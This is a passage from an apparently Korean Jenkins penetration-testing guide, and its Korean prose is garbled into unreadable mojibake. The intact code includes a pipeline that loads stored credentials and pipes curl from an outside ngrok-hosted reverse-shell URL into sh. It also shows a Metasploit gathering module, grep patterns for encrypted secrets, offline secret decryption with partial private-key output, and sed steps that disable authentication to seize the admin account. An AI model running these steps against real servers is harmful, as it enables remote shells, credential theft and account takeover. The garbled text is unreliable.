`/computer/`ì—ì„œ **êµ¬ì„±ëœ ë…¸ë“œ**ë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆìœ¼ë©°, ì¼ë°˜ì ìœ¼ë¡œ \*\*`ë‚´ì¥ ë…¸ë“œ` \*\* (Jenkinsë¥¼ ì‹¤í–‰í•˜ëŠ” ë…¸ë“œ)ì™€ ì¶”ê°€ë¡œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (249).png>)

**ë‚´ì¥ ë…¸ë“œë¥¼ ì¹¨í•´í•˜ëŠ” ê²ƒì´ íŠ¹íˆ í¥ë¯¸ë¡œìš´ë°**, ì´ê³³ì—ëŠ” ë¯¼ê°í•œ Jenkins ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

**íŒŒì´í”„ë¼ì¸ì„ ë‚´ì¥ Jenkins ë…¸ë“œì—ì„œ ì‹¤í–‰í•˜ë ¤ë©´** íŒŒì´í”„ë¼ì¸ ë‚´ì—ì„œ ë‹¤ìŒ êµ¬ì„±ì„ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
pipeline {
agent {label 'built-in'}
```
### ì™„ì „í•œ ì˜ˆì œ

íŠ¹ì • ì—ì´ì „íŠ¸ì—ì„œì˜ íŒŒì´í”„ë¼ì¸, cron íŠ¸ë¦¬ê±°ì™€ í•¨ê»˜, íŒŒì´í”„ë¼ì¸ ë° stage í™˜ê²½ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ 2ê°œì˜ ë³€ìˆ˜ë¥¼ ìŠ¤í…ì— ë¡œë“œí•˜ê³  ì—­ì‰˜ì„ ì „ì†¡í•˜ëŠ” ì˜ˆì‹œ:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## ì‚¬í›„ ì¹¨íˆ¬

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

ì¶©ë¶„í•œ ê¶Œí•œì´ ìˆë‹¤ë©´ `/credentials/`ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ì‹œí¬ë¦¿ì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” `credentials.xml` íŒŒì¼ ë‚´ì˜ ì‹œí¬ë¦¿ë§Œ ë‚˜ì—´í•˜ë©°, **ë¹Œë“œ êµ¬ì„± íŒŒì¼**ì—ëŠ” **ë” ë§ì€ ìê²© ì¦ëª…**ì´ í¬í•¨ë  ìˆ˜ ìˆìŒì„ ìœ ì˜í•˜ì‹­ì‹œì˜¤.

ë§Œì•½ **ê° í”„ë¡œì íŠ¸ì˜ êµ¬ì„±ì„ ë³¼ ìˆ˜ ìˆë‹¤ë©´**, í•´ë‹¹ êµ¬ì„±ì—ì„œ **ì €ì¥ì†Œì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ìê²© ì¦ëª…(ì‹œí¬ë¦¿)ì˜ ì´ë¦„**ê³¼ **í”„ë¡œì íŠ¸ì˜ ë‹¤ë¥¸ ìê²© ì¦ëª…**ì„ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (180).png>)

#### Groovyë¥¼ í†µí•´

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ë””ìŠ¤í¬ë¡œë¶€í„°

ë‹¤ìŒ íŒŒì¼ë“¤ì€ **Jenkins ì‹œí¬ë¦¿ì„ í•´ë…í•˜ëŠ” ë° í•„ìš”í•©ë‹ˆë‹¤**:

* secrets/master.key
* secrets/hudson.util.Secret

ì´ëŸ¬í•œ **ì‹œí¬ë¦¿ì€ ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒ ìœ„ì¹˜ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ë‹¤ìŒì€ í•´ë‹¹ ì‹œí¬ë¦¿ì„ ì°¾ê¸° ìœ„í•œ ì •ê·œì‹ì…ë‹ˆë‹¤:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins ë¹„ë°€ì„ ì˜¤í”„ë¼ì¸ìœ¼ë¡œ í•´ë…í•˜ê¸°

ë§Œì•½ **ë¹„ë°€ì„ í•´ë…í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ì•”í˜¸ë¥¼ ë¤í”„í–ˆë‹¤ë©´**, [**ì´ ìŠ¤í¬ë¦½íŠ¸**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **ë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ë¹„ë°€ì„ í•´ë…í•˜ì„¸ìš”**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### ê·¸ë£¨ë¹„ì—ì„œ Jenkins ë¹„ë°€ì„ í•´ë…í•˜ê¸°
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### ìƒˆë¡œìš´ ê´€ë¦¬ì ì‚¬ìš©ì ìƒì„±

1. `/var/lib/jenkins/config.xml` ë˜ëŠ” `C:\Program Files (x86)\Jenkis\`ì—ì„œ Jenkins config.xml íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•©ë‹ˆë‹¤.
2. `<useSecurity>true</useSecurity>`ë¼ëŠ” ë‹¨ì–´ë¥¼ ì°¾ì•„ **`true`**ë¥¼ **`false`**ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.
3. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
4. **Jenkins** ì„œë²„ë¥¼ **ì¬ì‹œì‘**í•©ë‹ˆë‹¤: `service jenkins restart`
5. ì´ì œ ë‹¤ì‹œ Jenkins í¬í„¸ë¡œ ì´ë™í•˜ë©´ **Jenkinsê°€ ì´ë²ˆì—ëŠ” ìê²© ì¦ëª…ì„ ìš”ì²­í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. "**Manage Jenkins**"ë¡œ ì´ë™í•˜ì—¬ **ê´€ë¦¬ì ì•”í˜¸ë¥¼ ë‹¤ì‹œ ì„¤ì •**í•©ë‹ˆë‹¤.
6. ì„¤ì •ì„ `<useSecurity>true</useSecurity>`ë¡œ ë³€ê²½í•˜ê³  **Jenkinsë¥¼ ë‹¤ì‹œ ì¬ì‹œì‘**í•˜ì—¬ **ë³´ì•ˆì„ ë‹¤ì‹œ í™œì„±í™”**í•©ë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)
